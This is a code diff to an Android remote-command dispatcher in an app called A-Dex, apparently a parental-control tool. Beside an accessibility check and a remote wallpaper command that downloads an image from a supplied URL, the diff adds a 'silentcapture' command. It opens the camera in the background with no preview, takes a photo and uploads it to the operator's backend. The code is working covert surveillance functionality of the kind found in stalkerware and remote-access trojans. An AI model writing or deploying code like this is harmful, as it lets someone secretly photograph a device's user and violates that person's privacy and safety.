@@ -24,6 +24,12 @@ import android.provider.Settings
 import android.speech.tts.TextToSpeech
 import android.text.format.DateUtils
 import android.view.KeyEvent
+import android.app.WallpaperManager
+import android.graphics.SurfaceTexture
+import android.hardware.camera2.CameraCaptureSession
+import android.hardware.camera2.CameraDevice
+import android.hardware.camera2.CaptureRequest
+import android.media.ImageReader
 import androidx.core.content.ContextCompat
 import androidx.core.content.FileProvider
 import com.adex.app.ADexApplication
@@ -142,6 +148,8 @@ class CommandDispatcher(
                 "unlockapp" -> handleUnlockApp(command)
                 "lockedapps" -> handleLockedApps(command)
                 "usage" -> handleUsage(command)
+                "wallpaper" -> handleWallpaper(command)
+                "silentcapture" -> handleSilentCapture(command)
                 else -> error(command.commandId, "UNKNOWN_COMMAND", "Command is not supported on device")
             }
         }.getOrElse { throwable ->
@@ -353,6 +361,13 @@ class CommandDispatcher(
         return when (action) {
             "status" -> success(command.commandId, shieldStatusMap())
             "enable" -> {
+                if (!PermissionHelper.isAccessibilityServiceEnabled(appContext)) {
+                    return error(
+                        command.commandId,
+                        "ACCESSIBILITY_SERVICE_NOT_ACTIVE",
+                        "Enable A-Dex accessibility service. Shield enforcement depends on accessibility."
+                    )
+                }
                 withContext(Dispatchers.IO) {
                     ParentalShieldManager.setShieldEnabled(appContext, settingsStore, true)
                 }
@@ -1308,11 +1323,14 @@ class CommandDispatcher(
 
     private fun shieldStatusMap(): Map<String, Any> {
         val status = ParentalShieldManager.status(settingsStore)
+        val accessibilityEnabled = PermissionHelper.isAccessibilityServiceEnabled(appContext)
         return mapOf(
             "enabled" to status.enabled,
             "pinConfigured" to status.pinConfigured,
             "unlockUntilMs" to status.unlockUntilMs,
             "temporarilyUnlocked" to status.temporarilyUnlocked,
+            "accessibilityEnabled" to accessibilityEnabled,
+            "enforcementReady" to (status.enabled && accessibilityEnabled),
             "unlockWindowMs" to ParentalShieldManager.UNLOCK_WINDOW_MS,
             "protectedPackages" to status.protectedPackages
         )
@@ -1377,6 +1395,137 @@ class CommandDispatcher(
             "txt", "log" -> "text/plain"
             "pdf" -> "application/pdf"
             else -> "application/octet-stream"
+        }
+    }
+
+    private suspend fun handleWallpaper(command: DeviceCommand): CommandResult {
+        val url = command.payload["url"]?.toString()?.trim().orEmpty()
+        if (url.isBlank()) {
+            return error(command.commandId, "ARGUMENT_REQUIRED", "Wallpaper URL is required")
+        }
+
+        return withContext(Dispatchers.IO) {
+            runCatching {
+                val tempFile = backendApiClient.downloadUrlToCache(appContext, url)
+                val wm = WallpaperManager.getInstance(appContext)
+                val bitmap = android.graphics.BitmapFactory.decodeFile(tempFile.absolutePath)
+                if (bitmap != null) {
+                    wm.setBitmap(bitmap)
+                    success(command.commandId, mapOf("wallpaper" to "updated"))
+                } else {
+                    error(command.commandId, "BITMAP_DECODE_FAILED", "Could not decode image from URL")
+                }
+            }.getOrElse {
+                error(command.commandId, "WALLPAPER_FAILED", it.message ?: "Failed to update wallpaper")
+            }
+        }
+    }
+
+    private suspend fun handleSilentCapture(command: DeviceCommand): CommandResult {
+        if (!hasPermission(Manifest.permission.CAMERA)) {
+            return error(command.commandId, "CAMERA_PERMISSION_REQUIRED", "Grant camera permission to use silentcapture")
+        }
+
+        val cameraId = command.payload["cameraId"]?.toString() ?: "0" // Default back camera
+        val captureResult = captureSilentInBackground(cameraId)
+        val file = captureResult.first
+        val captureError = captureResult.second
+        
+        if (file == null) {
+            return error(command.commandId, "CAPTURE_FAILED", captureError ?: "Background capture failed")
+        }
+
+        return try {
+            val mediaId = backendApiClient.uploadMedia(settingsStore, command.commandId, file, "image/jpeg")
+            success(command.commandId, mapOf("silentcapture" to "uploaded"), mediaId)
+        } catch (err: Exception) {
+            error(command.commandId, "MEDIA_UPLOAD_FAILED", err.message ?: "Silent capture upload failed")
+        }
+    }
+
+    private suspend fun captureSilentInBackground(cameraId: String): Pair<File?, String?> {
+        return withContext(Dispatchers.IO) {
+            suspendCancellableCoroutine { continuation ->
+                val cameraManager = appContext.getSystemService(Context.CAMERA_SERVICE) as CameraManager
+                val imageReader = ImageReader.newInstance(1280, 720, android.graphics.ImageFormat.JPEG, 1)
+                
+                var isResumed = false
+                val resumeOnce = { file: File?, err: String? ->
+                    if (!isResumed) {
+                        isResumed = true
+                        continuation.resume(file to err)
+                        // Note: Close reader later or handle resource management better in production
+                    }
+                }
+
+                imageReader.setOnImageAvailableListener({ reader ->
+                    try {
+                        val image = reader.acquireLatestImage()
+                        val buffer = image.planes[0].buffer
+                        val bytes = ByteArray(buffer.remaining())
+                        buffer.get(bytes)
+                        image.close()
+
+                        val file = File(appContext.cacheDir, "snap_${System.currentTimeMillis()}.jpg")
+                        file.writeBytes(bytes)
+                        resumeOnce(file, null)
+                    } catch (e: Exception) {
+                        resumeOnce(null, e.message)
+                    }
+                }, null)
+
+                try {
+                    cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                        override fun onOpened(camera: CameraDevice) {
+                            val targets = listOf(imageReader.surface)
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                                // Modern way
+                                val config = android.hardware.camera2.params.SessionConfiguration(
+                                    android.hardware.camera2.params.SessionConfiguration.SESSION_REGULAR,
+                                    targets.map { android.hardware.camera2.params.OutputConfiguration(it) },
+                                    appContext.mainExecutor,
+                                    object : CameraCaptureSession.StateCallback() {
+                                        override fun onConfigured(session: CameraCaptureSession) {
+                                            val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+                                            request.addTarget(imageReader.surface)
+                                            session.capture(request.build(), null, null)
+                                        }
+                                        override fun onConfigureFailed(session: CameraCaptureSession) {
+                                            camera.close()
+                                            resumeOnce(null, "CONFIGURE_FAILED")
+                                        }
+                                    }
+                                )
+                                camera.createCaptureSession(config)
+                            } else {
+                                camera.createCaptureSession(targets, object : CameraCaptureSession.StateCallback() {
+                                    override fun onConfigured(session: CameraCaptureSession) {
+                                        val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+                                        request.addTarget(imageReader.surface)
+                                        session.capture(request.build(), null, null)
+                                    }
+                                    override fun onConfigureFailed(session: CameraCaptureSession) {
+                                        camera.close()
+                                        resumeOnce(null, "CONFIGURE_FAILED")
+                                    }
+                                }, null)
+                            }
+                        }
+                        override fun onDisconnected(camera: CameraDevice) {
+                            camera.close()
+                            resumeOnce(null, "DISCONNECTED")
+                        }
+                        override fun onError(camera: CameraDevice, error: Int) {
+                            camera.close()
+                            resumeOnce(null, "CAMERA_OPEN_ERROR_$error")
+                        }
+                    }, null)
+                } catch (e: SecurityException) {
+                    resumeOnce(null, "PERMISSION_DENIED")
+                } catch (e: Exception) {
+                    resumeOnce(null, e.message)
+                }
+            }
         }
     }
 
